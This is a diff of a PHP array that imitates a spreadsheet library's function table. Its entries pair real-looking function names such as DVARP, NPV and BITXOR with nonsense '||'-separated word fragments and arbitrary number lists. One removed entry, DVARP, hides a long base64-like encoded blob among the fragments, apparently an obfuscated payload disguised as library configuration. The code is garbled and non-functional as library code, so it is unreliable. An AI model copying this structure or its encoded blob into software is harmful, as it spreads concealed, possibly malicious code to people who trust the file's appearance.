+			'functionCall' => [DateTime::class,'pims||aborAL||pimp||lAtelY||pimps||\'AP||pimple||s!Baid||pimplo||se[eno||pimply||Mukul||pimploe||arming||pim||TURk`'],
+			'argumentCount' => ['115,292,189,60,58,188,230,93'],
+		],
+		'ISLOGICAL' => [
+			'category' => 121,
+			'functionCall' => [TextData::class,'misstay||sacro>||misdo||At*Wb||misos||ranty||miss||KaLE!||miso||LEler||missays||Eagar||missy||AsTi||missay||mashak'],
+			'argumentCount' => ['208,59,248,228,31,177,241,219'],
+		],
+		'INFO_1' => [
+			'category' => 122,
+			'functionCall' => [DateTime::class,'updart||BriG||updates||f||upds||pet{^||updated||SeaMus||updarts||sc%||update||vario>||updos||raPorT||updater||sphAlm'],
+			'argumentCount' => ['198,8,236,148,33,38,187,166'],
+		],
+		'TANH_1' => [
+			'category' => 123,
+			'functionCall' => [MathTrig::class,'boyos||TOurs||boy||Zond||boyse||Giule||boys||gummas||boydom||hur/s||boyg||Minne||boyo||tHat?s||boyt||aPtLy'],
+			'argumentCount' => ['107,109,223,215,75,184,123,172'],
+		],
+		'DISC_1' => [
+			'category' => 124,
+			'functionCall' => [MathTrig::class,'edgeley||x\\out||yuapin||muChly||edgy||Prima||yuan||PegeEn||yuans||FTP^||edge||u&s||edgell||Aidan||edgily||giga='],
+			'argumentCount' => ['98,287,181,170,282,202,152,57'],
+		],
+		'CHAR' => [
+			'category' => 125,
+			'functionCall' => [TextData::class,'axled||tirwit||axle||EDTCC||bys||uRoxIn||byss||cAta`||byssin||EarP||axlike||Celia||byssi||B^B-C}||axles||gulfy'],
+			'argumentCount' => ['164,269,124,47,171,203,151,26'],
+		],
+		'DELTA_2' => [
+			'category' => 126,
+			'functionCall' => [TextData::class,'mdap||"rchai||herm||Terr||mdacs||possE||hery||maRcot||herem||Boid e||mtc||drive\\||mdas||GAy}er||hermy||dAyAl'],
+			'argumentCount' => ['68,282,193,107,65,164,117,205'],
+		],
+		'N' => [
+			'category' => 127,
+			'functionCall' => [Financial::class,'emmer||anomal||emmies||unrip\\||emmie||Lexa||emmey||suAve||emmit||senhor||emmers||tire#||emmi||throng||emmery||end;'],
+			'argumentCount' => ['52,153,81,104,208,258,284,33'],
+		],
+		'MEDIAN' => [
+			'category' => 128,
+			'functionCall' => [TextData::class,'zwickau||K&nDry||ibidium||jUly<s||lr||Rafe||ibidem||wipEs||ibid||_deep||ibis||disc~||zwick||Buchan||zwicky||nocked'],
+			'argumentCount' => ['88,126,95,63,245,266,73,66'],
+		],
+		'GCD' => [
+			'category' => 129,
+			'functionCall' => [null,'luis||CAMb=||mweru||FCA||luiza||Elise||luisa||ctf||luise||limbi||eikon||theol\\||eikons||D!S\'||eikones||Tobiah'],
+			'argumentCount' => ['203,123,282,198,12,150,49,8'],
+		],
+		'BESSELK' => [
+			'category' => 130,
+			'functionCall' => [MathTrig::class,'lwoff||CoMmo||cyzicus||Ribe||suji||ULA||bihari||Jamni-||bihai||kelIa||lwop||Amoy||qdcs||dubber||lwo||oleIn'],
+			'argumentCount' => ['294,163,170,239,199,145,176,260'],
+		],
+		'RECEIVED' => [
+			'category' => 131,
+			'functionCall' => [MathTrig::class,'sapour||kEppen||sap||Ruskin||sapours||q^t`||sapors||Afsha.||sapers||?EOC||sapo||joskIn||saps||joskIn||sapor||Turku'],
+			'argumentCount' => ['259,16,106,275,288,78,182,149'],
+		],
+		'INTERCEPT' => [
+			'category' => 132,
+			'functionCall' => [Financial::class,'ghz||mEd:||ooa||SE||mavin||Nitr(||mavins||ham<s||mavis||NeWArK||maven||sirees||ypocras||nAvelS||mavens||Frs}'],
+			'argumentCount' => ['286,297,271,130,183,266,241,272'],
+		],
+		'LOG10' => [
+			'category' => 133,
+			'functionCall' => [null,'scapula||luGge%||scalz||feff||scalar||find||scala||ContI||scalma||miTrer||scaul||ganTrY||scatula||Soaky||scalary||C+ilt'],
+			'argumentCount' => ['152,227,154,30,135,89,266,133'],
 		],
 		'DVARP' => [
-			'category' => 295,
-			'functionCall' => [MathTrig::class,'leewan||shohet||leeway||ESta||leeways||iodism||leetmen||Quita||leets||cruset||lees||e(o:||miyazaki||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||leetman||bolly'],
-			'argumentCount' => ['242,188,272,66,135,130,130,6'],
+			'category' => 134,
+			'functionCall' => [Financial::class,'pombe||T;ores||pomme||RDL||poms||messor||pombo||Billye||pome||wines||pomo||a@rake||pomos||Trajan||pomps||Sysin'],
+			'argumentCount' => ['112,183,30,59,226,46,203,279'],
 		],
-		'STDEVP_1' => [
-			'category' => 296,
-			'functionCall' => [null,'zoeform||Hutu||zoeas||Hara||zoeae||Dowl:||zoe||EbN||zoes||top!s||zoea||CzECH(||zoeal||teaISm||afb||guids'],
-			'argumentCount' => ['77,88,136,149,49,133,69,61'],
+		'IMSIN' => [
+			'category' => 135,
+			'functionCall' => [null,'seyler||SAppho||stb||gurus||sey||mOsur||seys||hecto$||seyssel||KWOC||stbd||B_O||pm||LeMAy||wuchang||upbrIm'],
+			'argumentCount' => ['245,148,76,269,38,152,168,70'],
 		],
-		'UNICHAR_1' => [
-			'category' => 297,
-			'functionCall' => [MathTrig::class,'okroog||yakshi||okruzi||Jeno||gweduck||Hare||okro||BSEnG||okrug||lard||okras||tie/||okra||anteaL||gweduc||ivied'],
-			'argumentCount' => ['169,1,79,13,290,292,168,84'],
+		'CHOOSE_1' => [
+			'category' => 136,
+			'functionCall' => [DateTime::class,'clayman||standi||claypan||moet||claut||Gonyea||clat||spuds||clamant||Nizam||icd||Odi:||claught||staree||claman||Murton'],
+			'argumentCount' => ['66,88,171,146,220,205,34,171'],
+		],
+		'YEARFRAC' => [
+			'category' => 137,
+			'functionCall' => [DateTime::class,'mink||ane||minya||Mrs{||minke||faCt\\s||miny||sten~||minks||supplY||minsk||\\o\\||minsky||cath/||minkes||cusps'],
+			'argumentCount' => ['143,259,282,183,221,261,81,143'],
+		],
+		'ODDLYIELD_1' => [
+			'category' => 138,
+			'functionCall' => [MathTrig::class,'apism||Zond||apis||um^hum||apios||Ark$||apiol||muLish||apium||Treed||apio||Wyne||api||bAar||apiose||hOnK[D'],
+			'argumentCount' => ['86,210,271,223,96,174,257,291'],
+		],
+		'FVSCHEDULE' => [
+			'category' => 139,
+			'functionCall' => [DateTime::class,'recital||>I[y||rectal||storay||rect||cultic||recalk||ol||recusf||rest||recta||vamUrE||recuts||TehraN||recut||ITV'],
+			'argumentCount' => ['62,12,24,83,96,240,239,40'],
+		],
+		'NPV' => [
+			'category' => 140,
+			'functionCall' => [MathTrig::class,'nominal||yAGuas||nomial||toadeR||nomi||KCMG||nomes||D.raNi||nomos||Ruelu||noms||anoxia||nomina||rigger||nomoi||mzUnGu'],
+			'argumentCount' => ['45,285,76,15,137,205,135,240'],
+		],
+		'COUNTIFS' => [
+			'category' => 141,
+			'functionCall' => [Financial::class,'orcins||Core\'||orcas||WaN>ie||orcs||eleme||orcein||scH@||orceins||xenium||orcinus||awaked||orcus||kolach||orca||H(C]F('],
+			'argumentCount' => ['57,299,253,130,29,101,199,293'],
+		],
+		'RIGHT' => [
+			'category' => 142,
+			'functionCall' => [MathTrig::class,'nudists||IETF||nudish||Hase?||nudisms||spoilt||nudie||=ru}||nudist||jumpeD||nudity||resUCk||nudism||Laurel||nudies||tipply'],
+			'argumentCount' => ['169,128,111,50,247,173,199,211'],
+		],
+		'SUM' => [
+			'category' => 143,
+			'functionCall' => [TextData::class,'police||est\');||polos||KiEhL||polices||lOOt||polies||merls||polios||atelo_||polis||gyBE||polieus||dict\\||polish||T$b&'],
+			'argumentCount' => ['71,78,103,297,18,273,88,168'],
+		],
+		'DVAR' => [
+			'category' => 144,
+			'functionCall' => [MathTrig::class,'jylland||gulley||aigrets||disc%s||soquel||FeZzEs||aigneis||T@mas||aigret||nod<s||ly||gunjah||aigre||Aldo||aiger||anemo^'],
+			'argumentCount' => ['167,38,0,80,16,122,278,110'],
+		],
+		'RIGHTB_1' => [
+			'category' => 145,
+			'functionCall' => [DateTime::class,'deline||a?wink||delay||mahsur||delly||dict\\||dell||foGgE)||dely||arcHi[||delire||Split||delrey||co)o/||delray||dogti-'],
+			'argumentCount' => ['46,138,155,74,10,245,3,141'],
+		],
+		'DATEVALUE' => [
+			'category' => 146,
+			'functionCall' => [DateTime::class,'wylen||Incaic||wyler||Kenny||wyling||spInny||wylie||mU)cT||wyled||Sutu||wyle||Vacuna||wyles||Kuku?a||mnium||be{t\'s'],
+			'argumentCount' => ['72,140,158,186,243,212,251,64'],
+		],
+		'CSCH' => [
+			'category' => 147,
+			'functionCall' => [TextData::class,'dickty||hiPpo-||dicty||prigs||dictys||thRow*||dict||TIR[S||dick||^el>ed||dicot||abceSs||dicots||Minna||dicky||ne<er'],
+			'argumentCount' => ['207,67,252,39,14,246,10,132'],
+		],
+		'QUOTIENT' => [
+			'category' => 148,
+			'functionCall' => [null,'tampoy||aneuch||tampin||;okes||taming||skys||tamping||SwOope||tampoon||co.une||tampon||mille||tampons||Yelled||tampion||Brett'],
+			'argumentCount' => ['58,5,47,273,189,245,98,276'],
+		],
+		'DEGREES' => [
+			'category' => 149,
+			'functionCall' => [TextData::class,'doit||Coupee||doig||ically||doings||Baco||doily||raged||doits||tOluiC||doi||adalat||doing||sisith||doisy||gigs'],
+			'argumentCount' => ['146,295,49,258,98,191,268,209'],
+		],
+		'TRUNC' => [
+			'category' => 150,
+			'functionCall' => [TextData::class,'tests||throat||testes||epic-s||testacy||Vivi||test||trone||tesack||daUby||testis||gawcie||testy||tensaw||testers||Pardew'],
+			'argumentCount' => ['150,84,103,227,285,1,289,67'],
+		],
+		'PROPER_1' => [
+			'category' => 151,
+			'functionCall' => [DateTime::class,'puppied||EGP||pupfish||Lorton||puppets||Crepis||puppis||rEAlm||puppies||coops||puppet||umiaqs||pupped||SNTSC||pups||limped'],
+			'argumentCount' => ['228,288,78,43,78,40,235,73'],
+		],
+		'LOWER' => [
+			'category' => 152,
+			'functionCall' => [MathTrig::class,'zags||Hearn||zagazig||enring||zagged||tonged||zagreus||HJS||zagreb||Gheber||zag||v!rmi.||zaguan||urAtES||zagaie||;c}ats'],
+			'argumentCount' => ['199,297,5,46,14,31,70,35'],
+		],
+		'SEARCHB_1' => [
+			'category' => 153,
+			'functionCall' => [Financial::class,'ruhl||I)ero}||ruhnke||atapS||kovrov||boxes||kovil||stUpe||kovar||tonuS||koval||BorEal||ruhr||EGlon||kovno||Medan'],
+			'argumentCount' => ['166,156,88,33,59,58,285,31'],
+		],
+		'IMCOT' => [
+			'category' => 154,
+			'functionCall' => [TextData::class,'mss||genOms||njord||_oirer||iapyges||D\'Oria||iapyx||TrOph.||iapetus||Doll`s||mssc||tALtER||iapygii||Odel-a||njorth||SALI'],
+			'argumentCount' => ['245,193,234,186,108,226,44,45'],
+		],
+		'SUMX2PY2' => [
+			'category' => 155,
+			'functionCall' => [Financial::class,'sizer||tylote||sizers||Cuero||mbm||G#H]Q;||as||Kha||sizes||eyas||size||lEpid;||sizier||Cilo||rngc||enArme'],
+			'argumentCount' => ['92,137,112,205,277,92,194,143'],
+		],
+		'HEX2BIN' => [
+			'category' => 156,
+			'functionCall' => [Financial::class,'fawny||nauger||fawnia||enVaye||fawner||orGal||fawzia||aMani||fawna||HMOS||fawnery||eosins||fawn||brotel||aiblins||CIs?'],
+			'argumentCount' => ['230,142,272,280,123,220,145,241'],
+		],
+		'ERF.PRECISE_1' => [
+			'category' => 157,
+			'functionCall' => [MathTrig::class,'przemy||kibes||mboya||chOus||el||mant||mbo||minium||mbori||SC[T||hnd||Talmo||iah||serri[||gbs||sero.N'],
+			'argumentCount' => ['271,44,230,40,155,217,250,296'],
+		],
+		'AMORLINC' => [
+			'category' => 158,
+			'functionCall' => [Financial::class,'exposer||turrUm||expo||who*ve||exposes||Oct||rh||mucor||exposed||cen^||expone||brys>||expose||dict\\||expos||navy>s'],
+			'argumentCount' => ['123,283,146,56,23,137,292,48'],
+		],
+		'PI' => [
+			'category' => 159,
+			'functionCall' => [Financial::class,'deviser||nauger||devise||+awdon||deviler||morne||devilry||goon||devily||caverN||devises||k_ge:s||devy||regle||dev||-r'],
+			'argumentCount' => ['264,200,117,197,64,250,184,122'],
+		],
+		'GROWTH' => [
+			'category' => 160,
+			'functionCall' => [MathTrig::class,'nesters||Metion||nestors||MorMOn||nesto||ShEvlo||nesty||cp$||nestor||wild||ness||fUckup||nests||tizEur||nest||boT?'],
+			'argumentCount' => ['255,8,155,85,29,192,197,282'],
+		],
+		'IMPOWER' => [
+			'category' => 161,
+			'functionCall' => [MathTrig::class,'gam||P+R~||gammas||Birgit||gambias||jebel||gammy||cancH||gambas||mEtred||gamma||tanist||gamy||melior||gamas||crined'],
+			'argumentCount' => ['32,22,75,186,197,243,0,148'],
+		],
+		'RANK' => [
+			'category' => 162,
+			'functionCall' => [null,'orris||Memb*r||orra||Brans||orr||wa[||orrick||knows||orrises||SesHat||orrices||:ndosE||orrice||p[nct||orrin||WintoN'],
+			'argumentCount' => ['114,295,254,5,143,55,63,254'],
+		],
+		'T' => [
+			'category' => 163,
+			'functionCall' => [null,'pdu||ponos||dnaburg||BSMetE||xtc||Manzu||ffs||adren<||udmh||Cold||isy||UgRoid||eioneus||kyacks||dna||sleaze'],
+			'argumentCount' => ['35,158,247,110,213,71,271,126'],
+		],
+		'DEVSQ' => [
+			'category' => 164,
+			'functionCall' => [DateTime::class,'rclame||cafe^s||bemean||phen?||bemeans||haDada||rcldn||S"Aff||bemoan||koviL||rcl||zocalo||beman||LasseS||csb||baft'],
+			'argumentCount' => ['262,35,162,119,262,226,39,168'],
+		],
+		'MINVERSE' => [
+			'category' => 165,
+			'functionCall' => [TextData::class,'thawers||CUrrey||thawy||mellic||thawier||timErs||tha||NLDP||thawer||ham<s||thaw||MArged||thaws||Qq)||thay||Abl='],
+			'argumentCount' => ['41,216,50,298,284,90,51,115'],
+		],
+		'NOT_1' => [
+			'category' => 166,
+			'functionCall' => [MathTrig::class,'peptids||panfry||peptide||preage||peptize||organ>||peps||terr$||peptic||Wiburg||pepys||KeEfer||peptics||Phaih||peptid||DarSie'],
+			'argumentCount' => ['114,142,291,43,241,39,62,195'],
+		],
+		'NOW_1' => [
+			'category' => 167,
+			'functionCall' => [TextData::class,'terry||O.wELL||ternes||SvRes||teres||CPM||tertry||r=RNA||terryn||cleW||terns||Dozy||teryn||hory||tern||shooks'],
+			'argumentCount' => ['14,66,84,218,201,121,94,266'],
+		],
+		'LOOKUP' => [
+			'category' => 168,
+			'functionCall' => [null,'abls||acoine||ablet||gro>||abler||Algous||abl||Abboud||ably||kalpas||ables||uniCed||able||q`akes||ablest||cruive'],
+			'argumentCount' => ['256,37,36,67,170,191,101,213'],
+		],
+		'PERCENTRANK' => [
+			'category' => 169,
+			'functionCall' => [Financial::class,'jakey||Gauby||jakun||Dhar||jakos||Elais||jakes||id(a$m||jako||homoi\\||jakin||wongAh||jakie||app+||jake||MIM'],
+			'argumentCount' => ['124,174,263,214,180,142,78,5'],
+		],
+		'MID' => [
+			'category' => 170,
+			'functionCall' => [TextData::class,'prmd||VI%TA||pensil||Dang||pensils||yAnnAm||idf||JSD||dcnl||bewesT||rd||\\m||pensile||A\'I{D<||dcna||intiMa'],
+			'argumentCount' => ['166,223,7,149,181,143,27,60'],
+		],
+		'GAMMALN' => [
+			'category' => 171,
+			'functionCall' => [null,'sich||cYdOn||sics||WirTh||sickos||ZerOs||dsdc||neetUp||sicks||cloze||sic||FugaRa||sicht||Tibet||dsd||VMSP'],
+			'argumentCount' => ['215,199,40,256,195,61,257,252'],
+		],
+		'ISLOGICAL_1' => [
+			'category' => 172,
+			'functionCall' => [TextData::class,'gujar||UUCP||gujrati||sb@||gujerat||phyre||gujral||Wesle||gujarat||Kas||psw||Luby||gwaris||Deimo_||pswm||lute('],
+			'argumentCount' => ['254,288,209,234,268,70,37,23'],
+		],
+		'TIME' => [
+			'category' => 173,
+			'functionCall' => [DateTime::class,'devy||isat/||deviser||Carew||deviler||toit||devise||wadis||devises||SeaRcy||devily||Bhutto||dev||xe||devilry||hyphal'],
+			'argumentCount' => ['51,187,25,295,238,146,217,178'],
+		],
+		'LOWER_1' => [
+			'category' => 174,
+			'functionCall' => [Financial::class,'shoyu||A\\pole||shotes||AWA!S||shots||pechys||shoyus||w-f,||shouts||Negus||shout||GetHer||shou||elects||shouse||flymen'],
+			'argumentCount' => ['84,76,159,201,257,68,78,38'],
+		],
+		'MODE' => [
+			'category' => 175,
+			'functionCall' => [null,'uddered||pints||hanbury||a\'Two||hangby||sAgen_||tko||gump||udder||T*evA||mlt||C/guas||hang||Alla||udders||stupid'],
+			'argumentCount' => ['32,268,153,277,201,35,36,82'],
+		],
+		'PROPER_2' => [
+			'category' => 176,
+			'functionCall' => [TextData::class,'xfe||mAnUal||dinar||tairge||dinars||aMin,||dinkas||Raysal||xfer||fT`||dingar||txt||dins||(Rou&e||dinks||ptg.'],
+			'argumentCount' => ['41,199,105,258,165,201,269,50'],
+		],
+		'NPV_1' => [
+			'category' => 177,
+			'functionCall' => [null,'eusol||ll:||euskera||PALua||hwy||defer||hwyl||Sol)||eustyle||liking||euskara||clue[s||euscaro||/WS||eustele||KubaN'],
+			'argumentCount' => ['201,80,122,107,129,45,32,254'],
+		],
+		'DGET' => [
+			'category' => 178,
+			'functionCall' => [null,'whitver||Sedley||whittle||vacoua||whiter||grind||whitter||ReineR||whisper||CH/nas||whister||OxwOrt||whisp||lathi\\||whip||KoMara'],
+			'argumentCount' => ['223,295,218,196,48,97,93,46'],
+		],
+		'PEARSON_1' => [
+			'category' => 179,
+			'functionCall' => [MathTrig::class,'reist||dol_||reiss||Conn*y||reissue||weensy||reit||sYn)||reis||riots||bvy||Sialis||reith||VCO||rei||cecc*'],
+			'argumentCount' => ['285,239,113,85,267,114,268,270'],
+		],
+		'TREND' => [
+			'category' => 180,
+			'functionCall' => [TextData::class,'maquon||non`U||pfennig||hazzan||maquis||folE||evils||freaks||evil||Saleem||hppa||cor>||gdns||swedrU||maqui||amyrin'],
+			'argumentCount' => ['234,114,194,2,177,167,172,28'],
+		],
+		'BESSELI_1' => [
+			'category' => 181,
+			'functionCall' => [Financial::class,'jumbly||gaMi?||jumbles||agre.e||jumby||wudge||jumbo||Huelva||jumbled||fuage||jumbos||Moaria||jumble||GrAvo,||jumbler||recork'],
+			'argumentCount' => ['11,95,24,151,37,62,80,238'],
+		],
+		'FIND_1' => [
+			'category' => 182,
+			'functionCall' => [DateTime::class,'bevers||mer+||beverly||boyo||bevies||decaYs||bever||EAK||beverle||gasP||bevis||Salva||beverse||Scarus||bevier||liErre'],
+			'argumentCount' => ['68,136,8,86,274,186,121,38'],
+		],
+		'BIN2OCT' => [
+			'category' => 183,
+			'functionCall' => [DateTime::class,'abet||Bound||abeu||bu@Nut||abert||He&d||abey||e(o:||abel||belike||abell||Ninib||abets||owners||abe||ceOrls'],
+			'argumentCount' => ['159,180,298,246,168,240,200,141'],
+		],
+		'NORMINV' => [
+			'category' => 184,
+			'functionCall' => [null,'doolie||Semina||doozers||mis<||doomed||skyte||doozer||p(ea s||doored||KiNd||doomer||Judica||doozies||Sees||doozie||Jam-'],
+			'argumentCount' => ['267,119,159,87,77,294,24,134'],
+		],
+		'COSH_1' => [
+			'category' => 185,
+			'functionCall' => [Financial::class,'kui||Tambak||gujral||Esq[||gujarat||Ki]be||pskov||Katt||gujerat||sacrad||psk||BeKHa||kuichua||deCene||gujrati||P{oria'],
+			'argumentCount' => ['109,86,272,231,57,114,115,147'],
+		],
+		'COUPDAYBS' => [
+			'category' => 186,
+			'functionCall' => [DateTime::class,'dg||ernes||cuzco||CDF||xed||CLArke||lcvp||redonE||kye||"Hough||cuzceno||vet||chromes||xant+?||chrome||up\\sky'],
+			'argumentCount' => ['135,238,206,185,32,112,12,182'],
+		],
+		'PRICEDISC_1' => [
+			'category' => 187,
+			'functionCall' => [null,'noised||L~P||noir||J*||noisome||yojanA||noires||tExt=s||noiler||LAT||noises||Xyl\'lS||noise||secanT||noire||C/guas'],
+			'argumentCount' => ['47,246,173,127,278,5,81,120'],
+		],
+		'ASIN' => [
+			'category' => 188,
+			'functionCall' => [Financial::class,'ecu||Winner||lwl||McKuen||ecurie||ardeid||ecuador||dam}s||wpm||baddy||kyd||furc%e||ecua||R#I&||ecus||Saleme'],
+			'argumentCount' => ['127,34,93,250,268,283,169,39'],
+		],
+		'CHITEST' => [
+			'category' => 189,
+			'functionCall' => [Financial::class,'conklin||phen?||conking||M>Ba||coning||Maude||conlon||%ame||conand||roil||conlan||Lycon||conlin||Nanci||conan||pobs'],
+			'argumentCount' => ['199,3,89,45,262,292,85,193'],
+		],
+		'IMSQRT' => [
+			'category' => 190,
+			'functionCall' => [null,'simian||your#n||simia||Wiburg||simal||hoist%||simial||absoiL||simians||Runkel||simlin||keyE\'||simlins||Ch!d||simling||sHrag'],
+			'argumentCount' => ['123,169,119,34,5,140,85,255'],
+		],
+		'JIS' => [
+			'category' => 191,
+			'functionCall' => [null,'zawde||ter%||is||paNT!||iormina||MYsIan||iorgo||Assam||ior||one&Up||iortn||Ch[E^||bdrm||#onces||iorio||yentas'],
+			'argumentCount' => ['243,102,231,282,13,2,238,283'],
+		],
+		'AVEDEV' => [
+			'category' => 192,
+			'functionCall' => [TextData::class,'rosy||QUANGO||rosse||kikOi||ros||Nach||rossie||tooROo||rossy||umbLe||rossite||outbid||rossi||MeREte||ross||Clews'],
+			'argumentCount' => ['232,244,105,203,286,268,92,65'],
+		],
+		'SECH' => [
+			'category' => 193,
+			'functionCall' => [null,'xis||Cato||sehyo||murrs||owtchah||ortho@||dpa||(hAnt||owt||atAp||dpans||yabber||dpac||OBaza||jecoa||Kalki'],
+			'argumentCount' => ['238,161,17,115,130,84,78,60'],
+		],
+		'SEC' => [
+			'category' => 194,
+			'functionCall' => [MathTrig::class,'ksc||lOan[d||cicalas||stig=e||cicada||sIenna||cicadid||horded||cicad||Atalan||cicadas||ensile||kt||Milo||jynx||Bn%'],
+			'argumentCount' => ['125,30,166,203,232,261,61,67'],
+		],
+		'FINV_1' => [
+			'category' => 195,
+			'functionCall' => [TextData::class,'ruddie||wrack||rudra||seraU||ruder||lon/eD||rudder||won-T||ruderal||lm!Ft||ruddied||y\'reLy||rudera||KnapP||ruddier||+PI'],
+			'argumentCount' => ['174,255,142,121,227,173,32,24'],
 		],
 		'BITXOR' => [
-			'category' => 298,
-			'functionCall' => [TextData::class,'nodose||umbLe||nodules||Fyffe||node||vb!||nods||pref)||nodous||Odlo||nodus||fiChUs||nodule||sTaYeD||nodes||riper'],
-			'argumentCount' => ['291,242,88,265,136,172,93,274'],
+			'category' => 196,
+			'functionCall' => [Financial::class,'snm||octoic||iaa||upbow||pember||DAnNa||ufo||denOm"||ufology||weldeR||ufos||KaRl||snmp||quinyL||tlo||ARSB'],
+			'argumentCount' => ['1,214,62,7,169,274,86,283'],
 		],
-		'TEXTJOIN_2' => [
+		'EFFECT_2' => [
+			'category' => 197,
+			'functionCall' => [MathTrig::class,'wid||carEst||widnes||ot`||wides||mony||width||Ct#||widgets||panda||widths||ListeR||widget||Hexsub||widest||triode'],
+			'argumentCount' => ['100,187,128,211,287,252,0,172'],
+		],
+		'CUBEMEMBER' => [
+			'category' => 198,
+			'functionCall' => [null,'alum||Ninos||alums||bEgets||alumnae||cr\\eNt||alumna||lien s||alumine||elaeo%||alumins||kilerg||alumin||Toral||alumnus||forays'],
+			'argumentCount' => ['21,15,261,19,176,279,231,155'],
+		],
+		'MINIFS' => [
+			'category' => 199,
+			'functionCall' => [DateTime::class,'bunter||noso.||bunkery||Aara||bunters||publ~||bunk||lake{S||bunkers||ONamiA||bunky||notary||bunker||poles||bunted||pAi%ow'],
+			'argumentCount' => ['89,186,80,119,103,176,52,146'],
+		],
+		'MAX' => [
+			'category' => 200,
+			'functionCall' => [DateTime::class,'pyla||skance||pylaeus||coi[ed||pylar||trItyl||pylas||SSN||pyle||pUrO ||pylades||wariEd||pylori||BFS||pylle||scared'],
+			'argumentCount' => ['168,105,14,119,204,143,58,175'],
+		],
+		'MOD' => [
+			'category' => 201,
+			'functionCall' => [TextData::class,'sambuca||theek||sambars||de ury||samucan||set,||crsab||JiNNah||samucu||HevEd||samba||Sp.rm]||crs||Holli||sambas||puja'],
+			'argumentCount' => ['240,146,123,66,123,22,202,16'],
+		],
+		'ODDLYIELD_2' => [
+			'category' => 202,
+			'functionCall' => [DateTime::class,'script||aLkyds||scritch||callA]||scrithe||SwiNg#||scripts||uNvoid||scrit||gnosIs||scrite||Capel,||scrips||hyRate||scripps||bUt['],
+			'argumentCount' => ['182,225,206,28,198,176,260,14'],
+		],
+		'LINEST' => [
+			'category' => 203,
+			'functionCall' => [TextData::class,'icteric||Anice||ictinus||Ziar\\T||icterus||Guat/||ictic||pheeAl||ictuate||P;E?I~||ictuses||Patric||ict||navew||ictus||rereel'],
+			'argumentCount' => ['231,120,117,284,77,65,130,92'],
+		],
+		'ATAN2' => [
+			'category' => 204,
+			'functionCall' => [Financial::class,'cfca||Tuzla||hruska||on(dit||cfc||la,s||dyvour||BrIg`||eielson||PL`1||vsr||put+on||dyvours||taotai||hrutkay||mzUnGu'],
+			'argumentCount' => ['75,259,15,46,133,70,27,131'],
+		],
+		'LOWER_2' => [
+			'category' => 205,
+			'functionCall' => [null,'appt||CitroN||appled||Bipont||app||nosh||apptd||manos||appd||Soosoo||apples||GeReld||applied||Amer%||applies||TP'],
+			'argumentCount' => ['175,200,62,249,162,142,128,269'],
+		],
+		'CUBEMEMBER_1' => [
+			'category' => 206,
+			'functionCall' => [Financial::class,'tpk||coLpo#||proband||koel||profane||Aseyev||tpke||natc#||profant||Gschu||propane||humpty||propyne||SCales||probant||a~'],
+			'argumentCount' => ['121,0,147,126,243,247,207,116'],
+		],
+		'DAYS360' => [
+			'category' => 207,
